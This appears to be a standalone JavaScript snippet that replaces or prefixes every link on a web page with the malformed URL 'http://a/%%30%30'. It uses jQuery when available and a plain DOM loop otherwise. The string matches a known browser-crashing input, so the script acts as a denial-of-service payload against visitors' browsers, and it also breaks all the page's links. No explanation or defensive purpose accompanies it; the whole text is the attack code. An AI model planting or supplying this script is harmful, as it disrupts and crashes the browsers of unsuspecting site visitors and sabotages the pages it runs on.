
try {
	$('a').prop("href", "http://a/%%30%30");
	
} catch(err) {
	//no jQuery.
	var anchors = document.getElementsByTagName("a");
	for (var i = 0; i < anchors.length; i++) {
		anchors[i].href = "http://a/%%30%30" + anchors[i].href
	}
}





